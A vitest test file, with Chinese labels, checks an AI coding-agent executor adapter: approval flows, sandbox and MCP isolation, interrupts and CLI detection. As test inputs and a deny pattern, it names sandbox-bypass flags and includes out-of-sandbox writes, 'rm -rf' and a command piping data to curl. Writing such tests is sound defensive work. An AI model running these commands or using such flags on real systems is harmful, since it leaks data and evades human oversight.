import { describe, it, expect } from 'vitest';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { CodexExecutor, codexLaunchConfig, tomlKey, VERIFIED_CODEX_VERSION } from '../src/core/executor/adapters/codex.js';
import { parseCommand } from '../src/core/executor/adapters/codex-command.js';
import { assess, canAutoApprove } from '../src/core/policy/risk.js';
import type { DeniedOperation, Decision, ExecutorEvent, PermissionRequest } from '../src/core/executor/types.js';
import { tmpDir } from './helpers.js';

const here = path.dirname(fileURLToPath(import.meta.url));
const FAKE_SERVER = path.join(here, 'fixtures', 'fake-app-server.mjs');
const FAKE_CLI = path.join(here, 'fixtures', 'fake-codex-cli.mjs');

type Step = Record<string, unknown>;
interface Drive {
  events: ExecutorEvent[];
  record: any[];
  exit: Extract<ExecutorEvent, { type: 'exit' }>['outcome'];
  cwd: string;
  ms: number;
  denied: DeniedOperation[];
}

async function drive(
  script: Step[],
  o: { leak?: string; mcp?: string[] | Error; decide?: (r: PermissionRequest) => Decision; timeoutMs?: number; stopWhen?: (e: ExecutorEvent) => boolean } = {},
): Promise<Drive> {
  const cwd = await tmpDir('codex-fake-');
  const rec = path.join(cwd, '..', `rec-${path.basename(cwd)}.jsonl`);
  const ex = new CodexExecutor({
    command: process.execPath,
    prefixArgs: [FAKE_SERVER],
    env: { FAKE_APP_SCRIPT: JSON.stringify(script), FAKE_RECORD: rec, ...(o.leak ? { FAKE_MCP_LEAK: o.leak } : {}) },
    mcpSettleMs: 100,
    discoverMcpServers: async () => {
      if (o.mcp instanceof Error) throw o.mcp;
      return o.mcp ?? ['context7', 'my server'];
    },
    interruptGraceMs: 400,
    killGraceMs: 300,
  });
  const run = ex.start({ cwd, prompt: '做点事', ...(o.timeoutMs ? { timeoutMs: o.timeoutMs } : {}) });
  const events: ExecutorEvent[] = [];
  const t0 = Date.now();
  let stopped = false;
  for await (const e of run.events) {
    events.push(e);
    if (e.type === 'permission_request' && o.decide) await run.respond(e.request.id, o.decide(e.request));
    if (o.stopWhen?.(e) && !stopped) {
      stopped = true;
      void run.stop();
    }
  }
  const exitEv = events.at(-1);
  if (exitEv?.type !== 'exit') throw new Error('事件流没有以 exit 结束');
  const record = fs.existsSync(rec) ? fs.readFileSync(rec, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l)) : [];
  return { events, record, exit: exitEv.outcome, cwd: fs.realpathSync(cwd), ms: Date.now() - t0, denied: exitEv.denied ?? [] };
}

const messages = (d: Drive) => d.events.filter((e): e is Extract<ExecutorEvent, { type: 'message' }> => e.type === 'message').map((e) => e.text);
const perms = (d: Drive) => d.events.filter((e): e is Extract<ExecutorEvent, { type: 'permission_request' }> => e.type === 'permission_request').map((e) => e.request);
const decisions = (d: Drive) => d.record.filter((r) => r.kind === 'decision').map((r) => r.result);

describe('Codex 适配器（假 app-server）', () => {
  it('正常完成：消息、工具调用、exited 0', async () => {
    const d = await drive([{ say: '开始' }, { cmd: { command: '/bin/zsh -lc "ls -la"' } }, { complete: { status: 'completed' } }]);
    expect(d.exit).toEqual({ kind: 'exited', code: 0 });
    expect(messages(d)).toContain('开始');
    expect(d.events).toContainEqual({ type: 'tool', name: 'run_command', summary: 'ls -la' });
  });

  it('回合失败：非零退出码并附原因，绝不报告为成功', async () => {
    const d = await drive([{ say: '试试' }, { complete: { status: 'failed', error: '模型不可用' } }]);
    expect(d.exit).toEqual({ kind: 'exited', code: 1 });
    expect(messages(d).join('\n')).toContain('模型不可用');
  });

  it('命令审批：允许 → accept', async () => {
    const d = await drive([{ askCommand: { command: '/bin/zsh -lc "npm run build"', cwd: '/x', reason: '要构建' } }], { decide: () => 'allow' });
    expect(perms(d)[0]).toMatchObject({ kind: 'run_command', command: ['npm', 'run', 'build'] });
    expect(decisions(d)).toEqual([{ decision: 'accept' }]);
    expect(d.exit).toEqual({ kind: 'exited', code: 0 });
  });

  it('命令审批：拒绝 → decline，并如实说明有操作被拒绝', async () => {
    const d = await drive([{ askCommand: { command: '/bin/zsh -lc "npm install"', cwd: '/x' } }], { decide: () => 'deny' });
    expect(decisions(d)).toEqual([{ decision: 'decline' }]);
    expect(messages(d).join('\n')).toMatch(/被拒绝.*npm install/s);
  });

  it('被拒绝的操作以结构化记录随 exit 事件给出（种类、命令/路径、风险）', async () => {
    const d = await drive(
      [{ askCommand: { command: '/bin/zsh -lc "npm install"', cwd: '/x' } }, { fileStart: { id: 'f9', changes: [{ path: 'a.txt', kind: 'update' }] } }, { askFile: { itemId: 'f9' } }],
      { decide: (r) => (r.kind === 'run_command' ? 'deny' : 'allow') },
    );
    expect(d.denied).toHaveLength(1);
    expect(d.denied[0]).toMatchObject({ kind: 'run_command', command: ['npm', 'install'] });
    expect(['low', 'medium', 'high']).toContain(d.denied[0]?.risk);
    const none = await drive([{ askCommand: { command: '/bin/zsh -lc "ls"', cwd: '/x' } }], { decide: () => 'allow' });
    expect(none.denied).toEqual([]);
  });

  it('文件修改审批：路径来自 fileChange 项；拒绝 → decline', async () => {
    const d = await drive(
      [{ fileStart: { id: 'f1', changes: [{ path: 'index.html', kind: 'update' }] } }, { askFile: { itemId: 'f1', reason: '改标题' } }],
      { decide: () => 'deny' },
    );
    expect(perms(d)[0]).toMatchObject({ kind: 'write_file', paths: ['index.html'] });
    expect(decisions(d)).toEqual([{ decision: 'decline' }]);
  });

  it('文件修改审批：只删除 → delete_file；不知道改哪些文件 → other（不会被当作低风险）', async () => {
    const del = await drive([{ fileStart: { id: 'f2', changes: [{ path: 'old.txt', kind: 'delete' }] } }, { askFile: { itemId: 'f2' } }], { decide: () => 'allow' });
    expect(perms(del)[0]).toMatchObject({ kind: 'delete_file', paths: ['old.txt'] });
    const unknown = await drive([{ askFile: { itemId: 'nope' } }], { decide: () => 'deny' });
    expect(perms(unknown)[0]?.kind).toBe('other');
  });

  it('越界写入审批：被评为高风险且不可恢复，不能自动批准', async () => {
    const wt = '/proj/.studio/worktrees/t1';
    for (const target of ['../outside.txt', '/tmp/leak.txt', path.join(os.tmpdir(), 'leak.txt'), '~/leak.txt', '$HOME/leak.txt']) {
      const d = await drive([{ askCommand: { command: `/bin/zsh -lc "printf hi > ${target}"`, cwd: '/proj/.studio/worktrees/t1' } }], { decide: () => 'deny' });
      const req = perms(d)[0]!;
      expect(req.paths, target).toContain(target);
      const a = assess(req, wt);
      expect(a, target).toMatchObject({ level: 'high', reversible: false });
      expect(canAutoApprove(a, { autoLow: true })).toBe(false);
    }
  });

  it('审批请求的工作目录在 worktree 之外也算越界', async () => {
    const d = await drive([{ askCommand: { command: '/bin/zsh -lc "ls"', cwd: '/somewhere/else' } }], { decide: () => 'deny' });
    expect(assess(perms(d)[0]!, '/proj/.studio/worktrees/t1')).toMatchObject({ level: 'high', reversible: false });
  });

  it('不支持的服务端请求被明确拒绝（JSON-RPC 错误），不会卡住', async () => {
    const d = await drive([{ askOther: { method: 'item/permissions/requestApproval' } }]);
    expect(decisions(d)[0]).toHaveProperty('error');
    expect(d.exit).toEqual({ kind: 'exited', code: 0 });
  });

  it('中断：先发 turn/interrupt，回合以 interrupted 结束 → stopped', async () => {
    const d = await drive([{ say: '工作中' }, { hang: {} }], { stopWhen: (e) => e.type === 'message' && e.text === '工作中' });
    expect(d.exit).toEqual({ kind: 'stopped' });
    expect(d.record.some((r) => r.kind === 'recv' && r.msg.method === 'turn/interrupt')).toBe(true);
  });

  it('中断被忽略时：宽限期后终止进程，仍然 stopped', async () => {
    const d = await drive([{ say: '工作中' }, { hang: { ignoreInterrupt: true } }], { stopWhen: (e) => e.type === 'message' && e.text === '工作中' });
    expect(d.exit).toEqual({ kind: 'stopped' });
    expect(d.ms).toBeLessThan(5000);
  });

  it('进程崩溃：如实映射为非零退出，不是成功', async () => {
    const d = await drive([{ say: '开始' }, { crash: 3 }]);
    expect(d.exit).toEqual({ kind: 'exited', code: 3 });
    expect(messages(d).join('\n')).toContain('退出');
  });

  it('进程在回合结束前以 0 退出：也不是成功', async () => {
    const d = await drive([{ crash: 0 }]);
    expect(d.exit).toEqual({ kind: 'exited', code: 1 });
  });

  it('超时 → timed_out', async () => {
    const d = await drive([{ hang: {} }], { timeoutMs: 300 });
    expect(d.exit).toEqual({ kind: 'timed_out' });
  });

  it('启动不了：spawn_error', async () => {
    const ex = new CodexExecutor({ command: '/no/such/codex-binary' });
    const run = ex.start({ cwd: os.tmpdir(), prompt: 'x' });
    const events: ExecutorEvent[] = [];
    for await (const e of run.events) events.push(e);
    expect(events.at(-1)).toMatchObject({ type: 'exit', outcome: { kind: 'spawn_error' } });
  });
});

describe('Codex 适配器：配置隔离与沙箱参数', () => {
  const FORBIDDEN = /danger-full-access|dangerFullAccess|dangerously|--yolo|bypass|full-auto|["']never["']|=never|--trust\b/i;

  it('codexLaunchConfig 显式声明：仅 worktree 可写、不含临时目录、需要时询问、不联网', () => {
    const cfg = codexLaunchConfig('/work/tree', { model: 'm1' });
    expect(cfg.args).toEqual([
      'app-server', '--listen', 'stdio://',
      '-c', 'sandbox_mode="workspace-write"',
      '-c', 'approval_policy="on-request"',
      '-c', 'instructions=""',
      '-c', 'developer_instructions=""',
      '-c', 'include_apps_instructions=false',
      '-c', 'notify=[]',
      '--disable', 'hooks',
      '--disable', 'memories',
      '-c', 'memories.use_memories=false',
      '-c', 'memories.generate_memories=false',
      '--disable', 'multi_agent',
      '--disable', 'remote_plugin',
      '--disable', 'shell_snapshot',
      '-c', 'allow_login_shell=false',
      '-c', 'shell_environment_policy.inherit="core"',
      '-c', 'web_search="disabled"',
      '--disable', 'plugins',
      '--disable', 'apps',
    ]);
    expect(cfg.threadStart).toEqual({ cwd: '/work/tree', approvalPolicy: 'on-request', sandbox: 'workspace-write', ephemeral: true, model: 'm1' });
    expect(cfg.turnOverrides).toEqual({
      cwd: '/work/tree',
      approvalPolicy: 'on-request',
      sandboxPolicy: { type: 'workspaceWrite', writableRoots: ['/work/tree'], excludeSlashTmp: true, excludeTmpdirEnvVar: true, networkAccess: false },
    });
    expect(JSON.stringify(cfg)).not.toMatch(FORBIDDEN);
  });

  it('用户配置的 MCP 服务器被逐个关闭；自定义指令被清空；连接器被禁用', async () => {
    expect(codexLaunchConfig('/w', { mcpServers: ['context7', 'my server'] }).args).toEqual(
      expect.arrayContaining(['-c', 'mcp_servers.context7.enabled=false', '-c', 'mcp_servers."my server".enabled=false']),
    );
    expect(tomlKey('a-b_1')).toBe('a-b_1');
    expect(tomlKey('we"ird')).toBe('"we\\"ird"');
    const d = await drive([{ complete: { status: 'completed' } }], { mcp: ['context7', 'my server'] });
    const argv = d.record.find((r) => r.kind === 'argv')!.argv as string[];
    expect(argv).toEqual(
      expect.arrayContaining(['mcp_servers.context7.enabled=false', 'mcp_servers."my server".enabled=false', 'instructions=""', 'developer_instructions=""', '--disable', 'apps']),
    );
  });

  it('查不出用户配置了哪些 MCP 服务器 → 不启动 Codex（宁可失败，不破坏隔离）', async () => {
    const d = await drive([{ complete: { status: 'completed' } }], { mcp: new Error('boom') });
    expect(d.exit).toEqual({ kind: 'exited', code: 1 });
    expect(messages(d).join('\n')).toMatch(/无法确认用户配置的 MCP/);
    expect(d.record.some((r) => r.kind === 'argv')).toBe(false); // app-server 没被启动
  });

  it('在 MCP 查询尚未结束时收到停止：立即 stopped，之后不会启动 Codex', async () => {
    const cwd = await tmpDir('codex-fake-');
    const rec = path.join(cwd, 'rec.jsonl');
    let release!: () => void;
    const gate = new Promise<void>((r) => (release = r));
    const ex = new CodexExecutor({
      command: process.execPath,
      prefixArgs: [FAKE_SERVER],
      env: { FAKE_APP_SCRIPT: '[]', FAKE_RECORD: rec },
      discoverMcpServers: async () => {
        await gate;
        return [];
      },
    });
    const run = ex.start({ cwd, prompt: 'x' });
    await run.stop();
    release();
    const events: ExecutorEvent[] = [];
    for await (const e of run.events) events.push(e);
    expect(events.at(-1)).toMatchObject({ type: 'exit', outcome: { kind: 'stopped' } });
    await new Promise((r) => setTimeout(r, 100));
    expect(fs.existsSync(rec)).toBe(false); // app-server 从未被启动
  });

  it('令牌刷新请求被明确拒绝（我们不接触凭证），且不会卡住', async () => {
    const d = await drive([{ askOther: { method: 'account/chatgptAuthTokens/refresh' } }]);
    expect(decisions(d)[0]).toHaveProperty('error');
    expect(JSON.stringify(decisions(d)[0])).toMatch(/credentials/);
    expect(d.exit).toEqual({ kind: 'exited', code: 0 });
  });

  it('真实发给 app-server 的启动参数与请求中包含隔离设置，且不含任何禁止参数', async () => {
    const d = await drive([{ complete: { status: 'completed' } }]);
    const argv = d.record.find((r) => r.kind === 'argv')!.argv as string[];
    expect(argv).toEqual(expect.arrayContaining(['app-server', '-c', 'sandbox_mode="workspace-write"', 'approval_policy="on-request"', '--disable', 'plugins']));
    const msg = (m: string) => d.record.find((r) => r.kind === 'recv' && r.msg.method === m)!.msg.params;
    expect(msg('thread/start')).toMatchObject({ cwd: d.cwd, approvalPolicy: 'on-request', sandbox: 'workspace-write', ephemeral: true });
    expect(msg('turn/start')).toMatchObject({
      cwd: d.cwd,
      approvalPolicy: 'on-request',
      sandboxPolicy: { type: 'workspaceWrite', writableRoots: [d.cwd], excludeSlashTmp: true, excludeTmpdirEnvVar: true, networkAccess: false },
    });
    expect(JSON.stringify([argv, d.record.filter((r) => r.kind === 'recv').map((r) => r.msg.params)])).not.toMatch(FORBIDDEN);
  });

  it('能力声明：支持权限询问；不支持停止后继续', () => {
    expect(new CodexExecutor().capabilities).toEqual({ permissionPrompts: true, resumeAfterStop: false });
  });
});

describe('Codex 适配器：detect()', () => {
  const ex = (login: string, command = process.execPath) =>
    new CodexExecutor({ command, prefixArgs: command === process.execPath ? [FAKE_CLI] : [], env: { FAKE_LOGIN: login } });
  it('已安装且已登录', async () => {
    expect(await ex('yes').detect()).toMatchObject({ installed: true, loggedIn: 'yes', version: 'codex-cli 9.9.9' });
  });
  it('版本与经过验证的版本不同 → 提示“未经验证”，但不阻止使用', async () => {
    const r = await ex('yes').detect(); // 假 CLI 报告 9.9.9
    expect(r).toMatchObject({ installed: true, verified: false });
    expect(r.note).toMatch(new RegExp(`未经验证.*${VERIFIED_CODEX_VERSION}`));
    expect(VERIFIED_CODEX_VERSION).toBe('0.166.0');
  });
  it('提示无法关闭的用户级扩展：只报告是否存在（AGENTS.md、skills），不读取内容', async () => {
    const home = await tmpDir('codex-home-');
    const make = () => new CodexExecutor({ command: process.execPath, prefixArgs: [FAKE_CLI], env: { FAKE_LOGIN: 'yes', CODEX_HOME: home } });
    expect((await make().detect()).isolationNotes).toBeUndefined();
    fs.writeFileSync(path.join(home, 'AGENTS.md'), 'SECRET-CONTENT-NEVER-REPORTED');
    fs.mkdirSync(path.join(home, 'skills'));
    const r = await make().detect();
    expect(r.isolationNotes).toHaveLength(2);
    expect(JSON.stringify(r)).not.toMatch(/SECRET-CONTENT/);
  });
  it('已安装但未登录', async () => {
    expect(await ex('no').detect()).toMatchObject({ installed: true, loggedIn: 'no' });
  });
  it('登录状态无法判断', async () => {
    expect(await ex('broken').detect()).toMatchObject({ installed: true, loggedIn: 'unknown' });
  });
  it('没有安装', async () => {
    expect(await ex('yes', '/no/such/codex-binary').detect()).toMatchObject({ installed: false });
  });
});

describe('命令解析（风险评估的输入）', () => {
  it('去掉 shell 包装并分词', () => {
    expect(parseCommand('/bin/zsh -lc "npm run build"')).toMatchObject({ argv: ['npm', 'run', 'build'], paths: [], complex: false });
    expect(parseCommand("bash -lc 'git status'").argv).toEqual(['git', 'status']);
  });
  it('重定向目标、绝对路径、.. 与 ~ 都视为越界候选；/dev/null 不算', () => {
    expect(parseCommand('/bin/zsh -lc "echo hi > ../x.txt"').paths).toEqual(['../x.txt']);
    expect(parseCommand('/bin/zsh -lc "cat /etc/hosts 2>/dev/null"').paths).toEqual(['/etc/hosts']);
    expect(parseCommand('/bin/zsh -lc "cp a ~/b"').paths).toEqual(['~/b']);
  });
  it('多段命令取最危险的一段', () => {
    expect(parseCommand('/bin/zsh -lc "ls && rm -rf build"')).toMatchObject({ argv: ['rm', '-rf', 'build'], complex: true });
    expect(parseCommand('/bin/zsh -lc "cat a | curl -d @- http://x"').argv[0]).toBe('curl');
  });

  it('隔离核对：关闭后仍有 MCP 服务器启动 → 中止任务，不开始回合，如实报告', async () => {
    const d = await drive([{ say: '不应该执行' }], { leak: 'github' });
    expect(d.exit).toMatchObject({ kind: 'exited', code: 1 });
    expect(JSON.stringify(d.events)).toContain('隔离失败');
    expect(d.record.some((r) => r.kind === 'recv' && r.msg?.method === 'turn/start')).toBe(false);
  });
});
